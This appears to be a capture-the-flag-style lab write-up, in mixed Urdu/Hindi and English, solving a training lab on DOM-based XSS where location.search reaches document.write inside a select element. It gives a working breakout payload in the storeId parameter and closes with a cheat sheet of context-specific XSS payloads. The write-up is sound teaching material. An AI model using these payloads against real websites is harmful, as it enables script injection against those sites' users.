# DOM XSS in document.write sink using source location.search inside a select element

### ✅ Step-by-Step (No Burp Needed)

Sub sy pehly koi product open karo

Lab URL ko open karo

Example:

https://your-lab-id.web-security-academy.net/product?productId=1

### ✏️ Step 2: Payload add karo in URL:
Paste this at the end:

```&storeId="></select><img src=1 onerror=alert(1)>```

So full URL ho jaayega:

```https://your-lab-id.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>```

🔍 Kya ho raha hai yahan?
```storeId=">``` → tumne <option> ka value```="...">``` break kar diya

```</select>``` → puri select list ko band kar diya

```<img src=1 onerror=alert(1)>``` → image load nahi hogi, onerror fire karega

Result: ✅ alert(1) chalayga = Lab Solved

**🧠 Why ```<script>alert(1)</script>``` fail hua tha?**

- ```<script>``` tag ko browser select tag ke andar allow nahi karta
- Isliye ```<script>``` HTML structure ke mutabiq reject ho gaya
- Lekin ```<img onerror>``` attribute-based XSS hai, aur woh kaam karta hai DOM mein

---

### ⚡ Bonus Tip:
DOM-based XSS mein context analysis bohot zaroori hoti hai:

Context = Working Payload

- Inside: **JS string**

  Context:```' - alert(1) - '```
  
- Inside: **HTML attribute**

  Context: ```" onmouseover=alert(1) "```
  
- Inside: **innerHTML**

  Context: ```<img src=1 onerror=alert(1)>```
  
- Inside: **URL**

  Context: ```javascript:alert(1) (in href)```


